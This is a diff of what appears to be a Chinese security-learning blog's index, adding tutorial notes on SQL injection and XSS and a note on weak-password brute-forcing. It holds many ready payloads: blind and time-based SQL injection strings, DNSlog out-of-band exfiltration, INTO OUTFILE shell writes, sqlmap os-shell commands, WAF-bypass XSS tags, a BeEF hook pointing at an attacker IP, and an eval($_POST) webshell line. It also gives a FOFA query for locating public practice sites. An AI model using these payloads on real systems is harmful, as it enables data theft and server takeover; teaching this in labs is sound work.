+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
+
+示例（表名：users，以第一个字符 u 为例）：
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
+
+
+猜解表内字段
+
+a.  判断字段总数
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
+
+更改数值，挨个测试，表名填自己想查询的表名。
+示例（假如 users 表里面有两个字段分别是 username 和  password）：
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
+
+b. 判断字段名长度
+?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
+
+示例（查第一个字段名的长度）：
+?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
+
+c. 逐字符猜字段名
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例（以 username 为例，查第一个字符 u）：
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
+
+
+猜解表中数据
+
+a. 判断数据长度
+?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
+
+示例：假设获得username 字段第一行数据的内容长度为 2
+?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
+
+b. 逐字符猜数据内容
+?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例：假设获得user字段第一行数据第一个字符内容
+?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
+
+
+4. 延迟盲注4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
+4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
+4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+测试延时注入点
+
+?id=1 and sleep(秒数)
+
+示例：
+?id=1 and sleep(5)
+
+
+猜数据库名
+
+a. 判断库名长度
+?id=1 and if(length(database())=数值,sleep(5),1)
+
+示例：
+?id=1 and if(length(database())=4,sleep(5),1)
+
+b. 逐字符猜库名
+?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
+
+
+猜数据表名
+
+a. 判断表名长度
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
+
+示例（库名为 data，长度为 4）：
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜表名
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
+
+
+猜字段名
+
+a. 判断字段名长度
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
+
+示例
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜字段
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
+
+
+猜表内数据
+
+?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
+
+注解
+
+序号：表 &#x2F; 字段排序，从 0 开始计数
+位数：字符串截取位置
+sleep (5)：条件成立延迟 5 秒响应
+
+
+5. DNSlog 盲注5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
+5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
+
+
+secure_file_priv&#x3D;null 不允许导入导出
+secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
+secure_file_priv&#x3D; 无限制
+
+5.3 有权限直接读取
+读取路径：
+
+?id=-1 union select 1,2,3,@@datadir
+
+
+读取文件：
+
+?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
+
+示例：（\ 转义）
+?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
+
+
+写入文件：
+
+?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
+
+示例：
+?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
+
+5.4 采用 DNSlog 带外获取http://dnslog.cn/
+实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn
+
+查当前库名
+
+?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
+
+注入后，点击网站的 Refresh Record 就会返回数据库名。
+
+查表名
+
+// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
+
+
+6. 二次注入6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
+6.2 实战
+碰撞用户，确认用户名 admin 存在
+注册用户名：admin&#39;#
+修改密码时执行SQL：
+
+update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
+
+admin&#39;#的密码没变，修改的是admin的密码
+
+7. 堆叠注入7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
+7.2 实战
+获取库名、表名、字段名、数据等信息
+构造攻击语句：
+
+?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
+
+
+三、SQLMap工具运用
+官⽹：https://sqlmap.org/
+作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
+
+1. 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
+
+2. 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
+
+四、SQL注入绕过1. 提交方式更改GET 改 POST
+安全狗（WAF 防御）
+2. 特殊字符绕过database/**/()
+
+3. 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
+
+4. 数据库特性绕过/*!44509select*/
+
+
+五、 SQL注入防护
+过滤：限制输入长度、识别拦截 SQL 恶意关键字（如 union、select、or 等）
+
+
+缺点：关键字过滤容易被绕过，不是最可靠手段。
+
+
+转义：把用户输入当做普通文本处理，对单引号&#39;等特殊符号进行转义，破坏注入语法。
+数据库权限控制、敏感数据加密
+
+
+最小权限原则：Web 账号不给高权限，禁止 drop、alter 等高风险操作；
+密码等敏感信息加密存储，就算被拖库也不会直接泄露明文。
+
+
+*预编译（参数化查询）***⭐**最核心、最优方案
+
+
+将 SQL 语句结构和用户输入完全分开，输入永远只被当作参数数据，不会被解析成 SQL 代码，从根源杜绝注入。
+
+
+六、总结
+报错注入是在 union 注入在查询不到的情况下，才使用
+在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>渗透测试</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS漏洞</title>
+    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、XSS简介与危害1. 定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+2. 危害
+盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
+控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
+盗窃企业重要的具有商业价值的资料
+非法转账
+强制发送电子邮件
+网站挂马
+控制受害者机器向其它网站发起攻击（重定向语句）
+窃取cookie的sessionid，冒充登录
+
+
+二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
+1. 反射型1.1 反射型流程
+黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
+客户端向URL对应的服务器发出请求
+服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
+客户端解析代码，恶意代码随之执行
+
+
+
+1.2 案例1.2.1 编写代码把 php 文件放在 phpstudy 的 www 目录下
+&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
+
+访问
+?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+
+1.2.2 fofa搜索命令&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
+
+
+
+
+
+进入 pikachu 靶场
+如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
+pikachu靶场：反射型XSS 练习
+
+反射型xss
+
+
+
+先输入 1 测试
+
+
+输入恶意代码
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+方法一：
+直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
+
+
+
+
+
+方法二：
+直接在输入框里输入恶意代码，但是我们发现会有长度限制：
+
+
+F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
+
+
+
+
+注意：改完之后不要刷新，不然又会恢复 20。
+
+
+总结：输入框长度限制可通过修改URL或F12改前端代码绕过
+
+2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
+以 pikachu 靶场为例：
+
+
+传入一个恶意代码
+&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+
+只要刷新这个页面，就会重复出现这句话。
+
+3. DOM型3.1 流程
+黑客诱导用户点击恶意URL
+
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+客户端直接执行攻击代码，无需与服务器交互
+攻击纯粹发生在客户端
+
+
+
+以 pikachu 靶场为例：
+
+
+先输入 1 测试一下
+
+
+传入一个恶意代码：
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+
+点击之后：
+
+
+
+三、BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
+BeEF是Kali自带的XSS利用工具，基于Ruby开发。
+
+
+1. 核心信息
+Web UI：http://127.0.0.1:3000/ui/panel
+Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+2. 攻击流程
+启动 BeEF
+
+beef-xss-start
+
+
+
+账号：beef** ，**我设置的密码是 kali
+
+
+
+黑客（Kali）IP 放入 Hook 代码中
+
+# 查看 IPifconfig
+
+
+
+&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+
+注入Hook代码到表单提交入库
+
+
+
+
+受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
+
+
+
+
+四、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
+http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
+
+2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
+2.1 手工绕过–标签语法替换
+audio标签
+
+&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
+
+
+video标签
+
+&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
+
+
+button标签
+
+&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
+
+2.2 加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+
+3. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
+3.1 常用参数XSStrike
+-h, --help显示帮助信息
+-u, --url指定目标 URL
+--dataPOST 方式提交内容
+-v, --verbose详细输出
+-f, --file加载自定义 payload 字典
+-t, --threads定义线程数
+-l, --level爬行深度
+-t, --encode定义 payload 编码方式
+--json将 POST 数据视为 JSON
+--path测试 URL 路径组件
+--seeds从文件中测试、抓取 URL
+--fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
+--update更新工具
+--timeout设置超时时间
+--params指定参数
+--crawl爬行目标网站
+--proxy使用代理
+--blind盲测试
+--skip跳过确认提示
+--skip-dom跳过 DOM 扫描
+--headers提供 HTTP 标头
+-d, --delay设置请求延迟
+
+3.2 使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+
+3.3 优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+五、总结Q1：XSS 是什么？跨站脚本攻击
+Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
+Q3：XSS有什么危害？1、获取浏览器的其他信息
+2、窃取浏览器的敏感信息
+3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
+Q4：怎么修复 XSS漏洞？过滤常见关键字
+Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -3357,465 +4686,1324 @@ Win7 ~ Win10 全版本
       </tags>
   </entry>
   <entry>
-    <title>PHP基础安全</title>
-    <url>/2026/06/22/PHP%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8/index/</url>
-    <content><![CDATA[一、什么是PHP?1. 定义PHP(全称:PHP: Hypertext Preprocessor,超文本预处理器)是一门开源的服务器端脚本编程语言, 专门用于开发Web网站的后端逻辑。
-2. 核心关键词
-服务器端：PHP代码只在远程服务器上运行,永远不会在用户的电脑浏览器中运行;用户的电脑只能看到PHP运行后返回的结果(网页、图片、文字等),看不到PHP源码。
-脚本语言：无需编译,服务器上的PHP引擎可以直接解析执行,开发&#x2F;运行效率高,这也是绝大多数 网站选择PHP做后端的核心原因。
-Web专属：PHP天生为网站开发而生,专门处理网站的后台业务逻辑,是目前全球使用量最高的 Web后端语言。
+    <title>弱口令与命令爆破</title>
+    <url>/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/</url>
+    <content><![CDATA[一、弱口令1. 定义复杂度极低、极易被猜到&#x2F;爆破的账号密码，是渗透最常见突破口。
+弱⼝令的来源：
 
-3. PHP在网站中的角色网站的组成分为「前端」和「后端」,两者分工明确,缺一不可:
+密码设置的⼈员疏忽⼤意，安全意识薄弱，为了⽅便记忆在不同的平台设置简单或同样的密码
+某些管理平台有默认的密码，⽽没有及时的修改密码
 
-前端(HTML&#x2F;CSS&#x2F;JS):只负责「展示」,比如页面布局、按钮样式、图片显示,运行在用户电脑,决定网站「长什么样」。
-后端(PHP):网站的核心大脑,只负责「处理业务逻辑」,运行在服务器,决定网站「能做什么」。
+2. 危害直接登录后台拿权限、篡改数据、上传木马、接管服务器
+二、密码字典1. 定义字典：存放大量常用账号、密码的文本文件，一行一个，用于弱口令爆破遍历尝试。
+2. 密码字典生成2.1 通用模式基于人类通性和历史数据的概率盲打，获取方式简单，数量众多。
+2.1.1 常见密码
+收录高频弱口令（如 123456、password）。
+包含不同类型的变体，能否破解出完全看运气和字典质量。
 
-PHP负责处理网站所有的核心操作:
+2.1.2 默认密码
+各种操作系统、中间件、网络设备安装后的出厂默认密码（如 Tomcat: tomcat/tomcat）。
 
-验证用户的账号密码是否正确,判断能否登录;
-接收用户上传的文件、表单信息,并处理&#x2F;保存;
-操作数据库,实现数据的增删改查(比如存储用户信息、文章内容);
-处理用户的所有请求,返回对应的结果给前端。
+2.2 定制模式针对特定目标（某人或某企业）的信息生成的定制字典，命中率极高。
+2.2.1 社工信息收集
+自主收集: 通过 FOFA、Google Dorks 等搜索引擎获取资产与人员信息。（有关信息收集的笔记供参考：https://blog.ss0t-hacked.top/2026/information-gathering）
+泄露查询: 使用公开合法渠道（如 https://www.reg007.com/）查验目标信息是否在已知泄露事件中（注意：数据通常不全）。
 
-4. PHP执行条件
-可访问
-可解析
-已知文件位置
 
+⚠️** 法律与安全红线:** 最好只使用自己收集的公开情报，千万不要私自搭建对外的社工库（严重违法）。
 
-二、为什么学PHP?1. PHP的市场占比极高,是漏洞重灾区在国内,80%以上的中小型网站、论坛、政务系统、企业平台的后端都是基于PHP开发(比如Discuz论坛、织梦CMS、帝国CMS、各类商城网站)。我们做渗透测试、挖漏洞,绝大多数的目标网站都是PHP开发的,不懂PHP,就看不懂网站的运行逻辑,更看不懂漏洞的成因。
-2. 不懂PHP,看不懂漏洞的底层原理所有的Web漏洞(文件上传、SQL注入、XSS、代码执行、文件包含),针对PHP网站的占比超过 70%。
+2.2.2 社工字典生成将收集到的碎片信息转化为可用的弱口令字典。
 
-比如:文件上传漏洞就是PHP代码写的不严谨导致的;
-比如:SQL注入就是PHP接收参数时没有过滤导致的;
-比如:WebShell能生效,本质就是PHP的函数执行逻辑被利用。
+信息组合: 平台原密码、邮箱前缀、QQ号、电话、生日、公司名等。
+规则变形:
+姓名拼音 + 生日后缀（例：zhangsan1990）
+首字母大写 + 特殊符号（例：Zhangsan@2026）
 
-只学工具、不学PHP原理,永远是「知其然不知其所以然」,永远成不了合格的网安工程师,只能做「脚本小子」。
-3. 不懂PHP,看不懂漏洞的利用方式我们挖漏洞的核心是「找到代码的缺陷」,渗透测试的核心是「利用代码的缺陷」。如果连PHP的基础语法、参数接收、函数作用都看不懂,就算找到了漏洞,也不知道怎么利用; 就算拿到了WebShell,也不知道怎么操作。
-4. PHP是网安入门最友好的后端语言PHP语法简单、易懂、贴近自然语言,相比于Java、Python、Go,PHP的入门成本最低,我们只需要学「网安相关的PHP基础」,不需要学完整的开发体系,就能满足渗透测试的需求,性价比极高。
 
-三、PHP核心基础语法1. PHP的标签风格一句话木马：&lt;?php eval($_POST[&#39;x&#39;]);?&gt; 有时候会遇到过滤标签 &lt;?php，直接上传会被拦截，可使用其他 PHP 标签绕过过滤。
-(1) 标准标签
-&lt;?phpecho &quot;111&quot;;?&gt;
+本地生成工具: 社⼯字典⽣成 weakpass
 
-适用：所有PHP环境,开发、代码审计标准写法,必须掌握。
-(2) 短标签
-&lt;?echo &quot;短标签&quot;;?&gt;
+三、自动化爆破工具1. bp 爆破1.1 模式：1.1.1 Sniper Attack（狙击手模式）
+字典数：1 个
+爆破点：1 个
+对单个定位点进行爆破，例如单独爆破密码。
 
-限制：需在php.ini开启short_open_tag,很多服务器默认禁用,不推荐生产使用。
-(3) ASP风格标签
-&lt;%echo &quot;ASP标签&quot;;%&gt;
+1.1.2 Battering Ram Attack
+字典数：1 个
+爆破点：≥2 个
+多点爆破，对多个点位同时爆破，所有爆破点使用同一个字典
 
-限制：需配置开启,现在基本淘汰,渗透很少遇见。
-(4) Script脚本标签
-&lt;script language=&quot;php&quot;&gt;echo &quot;script标签&quot;;&lt;/script&gt;
+1.1.3 Pitchfork Attack
+字典数：2 个（payload1、payload2）
+爆破点：≥2 个
+多点爆破，对多个点位进行同时爆破，每个爆破点都有属于自己字典，平行爆破，一一对应。
 
-老旧写法,现代环境基本废弃。
-2. PHP变量(1) 变量的定义
-PHP中,变量是用来存储数据的容器,比如存储文件的保存路径、存储用户上传的文件名、存储接收的参数等。
-(2) 变量的核心规则
+1.1.4 Cluster Bomb Attack （集束炸弹）
+字典数：2 个
+变量数：≥2 个
+多点爆破，对多个点位进行同时爆破，每个爆破点都有属于自己字典，双字典全组合，一对多。
 
-变量必须以 $ 开头,比如：$name、$upload_dir、$file_name；
-变量名区分大小写,比如 $name 和 $Name 是两个不同的变量；
-变量可以直接赋值,不需要提前声明类型,PHP会自动识别。
+1.2 怎么判断爆破成功
+通过响应状态码判断
+通过响应长度
+通过具体响应内容
 
-$upload_dir = &#x27;./uploads/&#x27;;  // 存储文件保存目录，字符串类型$age = 20;                   // 存储数字，数值类型
+1.3 配置 bp 爆破的几种情况1.3.1 只知道用户名但不知道密码示例：已知用户名是 admin，但是不知道密码
 
-(3) 常用变量场景
-在漏洞代码中,最常见的PHP变量就是文件上传相关的：$upload_dir（文件保存目录）、$file_name（文件名）、$file_path（文件完整路径）。
-3. 常见输出函数(1) echo
-用于输出数字、字符串、布尔值等单一基础数据类型,无返回值,使用频率最高。
-echo 123;echo &quot;hello&quot;;echo true;
+抓包，发送到 intruder
 
-补充：PHP单、双引号字符串解析
-单引号 &#39;&#39;：不会解析字符串内的$变量,不会转换\n、\t等转义符,仅能转义\&#39;和\\。
-$str = &quot;hello&quot;;echo &#x27;内容：$str&#x27;;// 输出：内容：$str
 
-双引号 &quot;&quot;：自动解析$变量并替换为变量值,支持\n、\t、\&quot;等全部转义字符。
-$str = &quot;hello&quot;;echo &quot;内容：$str&quot;;// 输出：内容：hello
 
-(2) print_r()
-专门打印数组、对象等复合类型数据,可清晰展示内部结构,调试代码常用。
-print_r($_FILES);
 
-4. PHP字符串拼接(1) 拼接规则
-PHP中,拼接两个字符串（比如把「保存目录」和「文件名」拼在一起得到完整路径）,使用英文点号 . 完成。
-$upload_dir = &#x27;./uploads/&#x27;;  // 定义文件保存目录$file_name = &#x27;test.php&#x27;;     // 定义文件名$file_path = $upload_dir . $file_name;  // 拼接得到完整路径：./uploads/test.php
+配置BP爆破
 
-(2) 意义
-文件上传漏洞中,攻击者就是利用这个语法,通过篡改文件名,让恶意文件被拼接成合法路径保存到服务器,这是漏洞利用的核心环节。
-5. PHP超全局变量(1) 什么是超全局变量?
 
-「全局」：在PHP代码的任何位置都可以直接使用,不需要提前定义；
-「超」：PHP官方内置的变量,专门用来接收用户传递的各种数据,天生存在,直接调用即可。
 
-(2) 核心特点
 
-所有超全局变量都是大写的数组形式；
-专门用来接收「用户从浏览器传递给服务器的数据」；
-是后端接收前端参数的核心方式,也是所有Web漏洞的「数据入口」。
 
-(3) $_FILES 超全局变量——文件上传专属
-$_FILES 是PHP专门用来接收用户上传文件的所有信息的超全局变量,没有它就实现不了文件上传功能。
 
-核心语法：$_FILES[&#39;表单名称&#39;][&#39;属性名&#39;]
-核心属性：a. $_FILES[&#39;file&#39;][&#39;name&#39;]：获取用户上传文件的「原始文件名」,比如 头像.jpg、test.php；  i. 重点：这个值是攻击者可以随意篡改的!攻击者可以把恶意PHP文件改成 头像.jpg.php,伪装成图片,这是文件上传漏洞的核心利用点。b. $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]：获取用户上传文件在服务器的「临时文件名+临时路径」；  i. 重点：这个值是PHP自动生成的,攻击者完全无法篡改、无法伪造,是PHP的安全机制,用来防止攻击者伪造文件上传。
 
-(4) $_GET 超全局变量——接收GET请求传递的参数
-$_GET 专门用来接收用户通过**「GET请求」**传递的所有数据,数据来自于浏览器地址栏的URL中。
 
-语法：$_GET[&#39;参数名&#39;]
-案例：访问网址 http://www.xxx.com/index.php?user=admin&amp;pwd=123,后端接收参数：
+判断爆破成功–通过响应状态码判断
 
-$user = $_GET[&#x27;user&#x27;];  // 接收的值是 admin$pwd = $_GET[&#x27;pwd&#x27;];    // 接收的值是 123
 
 
-特点：参数在URL中可见,适合传递非敏感的查询数据。
+1.3.2 用户名和密码都不知道
+依旧先抓包
+配置 bp 爆破
 
-(5) $_POST 超全局变量——接收POST请求传递的参数
-$_POST 专门用来接收用户通过**「POST请求」**传递的所有数据,数据藏在请求体中,URL中不可见。
 
-语法：$_POST[&#39;参数名&#39;]
-案例：用户登录时输入账号密码,点击登录,后端接收参数：
 
-$user = $_POST[&#x27;username&#x27;];  // 接收账号$pwd = $_POST[&#x27;password&#x27;];  // 接收密码
 
 
-特点：适合传递敏感数据、大文件、表单信息,文件上传、登录、注册等所有核心操作,都用POST传参；
-重点：WebShell的核心代码中,100%会用到 $_POST,比如 $_POST[123],用来接收攻击者的恶意指令。
+在用户名和密码都未知的情况下，爆破成功率极低，不建议尝试。
 
-6. PHP后端如何接收前端传递的参数?这是所有Web交互的核心,也是所有漏洞的起点：前端所有的数据,最终都会通过「超全局变量」被后端PHP接收并处理,没有第二种方式!
+使用 bp 验证码爆破（需要拓展插件 xiapao、使用 Cluster Bomb Attack ）
 
-接收GET请求的参数 → 用 $_GET
-场景：查询数据、搜索内容、分页等；
-语法：$变量名 = $_GET[&#39;参数名&#39;];
+示例：seacms 靶场
+首先安装好靶场，再进入后台管理系统。
 
 
-接收POST请求的参数 → 用 $_POST
-场景：登录、注册、提交表单、文件上传的表单信息等；
-语法：$变量名 = $_POST[&#39;参数名&#39;];
 
 
-接收上传的文件信息 → 用 $_FILES
-场景：所有文件上传操作；
-语法：$文件名 = $_FILES[&#39;file&#39;][&#39;name&#39;];
+http://127.0.0.1/weakpasswd/CMS/upload/4qy2hw
 
 
 
-总结：所有的Web漏洞,本质都是「后端接收了前端的恶意参数,并且没有做过滤,直接使用&#x2F;执行」。
-比如：SQL注入是接收了恶意的查询参数,文件上传是接收了恶意的文件名,代码执行是接收了恶意的指令参数。
+配置 xiapao 插件
 
-四、PHP面向对象核心——类与对象1. 核心概念(1) 类
-类是具有相同属性和行为的对象的抽象集合,是一种自定义的复合数据类型,定义了某一类事物共有的特征和能执行的操作。
-语法规范：PHP中定义类必须使用关键字 class,类名首字母建议大写
-class 类名 &#123;    // 这里写属性    // 这里写方法&#125;
 
-示例:
